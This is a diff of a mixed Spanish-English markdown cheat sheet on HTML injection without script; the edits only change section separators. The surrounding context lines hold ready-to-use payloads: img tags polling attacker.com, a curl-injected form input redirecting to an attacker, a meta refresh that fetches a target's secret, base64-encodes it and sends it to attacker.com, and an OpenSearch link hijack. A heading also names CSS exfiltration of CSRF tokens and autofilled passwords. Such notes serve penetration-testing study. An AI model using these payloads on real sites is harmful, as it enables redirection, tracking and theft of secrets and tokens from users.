@@ -17,7 +17,7 @@ linked:
 ---
 # HTML Injection - Inyección Sin Script
 
-***
+---
 
 ## Image `src` Exfil (Referer Leak)
 
@@ -35,7 +35,7 @@ linked:
 | `<img src="https://attacker.com/poll?t=$(date +%s)">` injection per minute (cron-fed) | Poll-style persistent tracker | Persistent tracker. |
 ^htmli-noscript-image
 
-___
+---
 
 ## Form Action Redirect
 
@@ -52,7 +52,7 @@ ___
 | `curl -X POST -d 'comment=<input form="legit-form" name="redirect" value="//attacker">' https://target/comments` | Cross-context input ownership | Cross-form ownership. |
 ^htmli-noscript-form
 
-___
+---
 
 ## Meta Refresh
 
@@ -70,7 +70,7 @@ ___
 | `curl 'https://target/?msg=<meta http-equiv="refresh" content="3;url=https://attacker.com/?d=$(curl -s https://target/secret \| base64)">'` | Combine con server-side fetch + exfil | Multi-stage. |
 ^htmli-noscript-meta
 
-___
+---
 
 ## `<base href>` Hijacking
 
@@ -100,7 +100,7 @@ ___
 <link rel="stylesheet" href="theme.css">  <!-- loads attacker CSS -->
 ```
 
-___
+---
 
 ## `<link rel>` Manipulation
 
@@ -120,7 +120,7 @@ ___
 | `curl 'https://target/?head=<link rel="search" type="application/opensearchdescription+xml" href="//attacker.com/o.xml">'` | OpenSearch hijack | Browser search engine. |
 ^htmli-noscript-linkrel
 
-___
+---
 
 ## CSS-Only Attacks (Cross-Site Styles)
 
@@ -156,4 +156,4 @@ ___
 
 Char-by-char exfiltration de input values (CSRF token, password de browser autofill) sin JS.
 
-***
+---
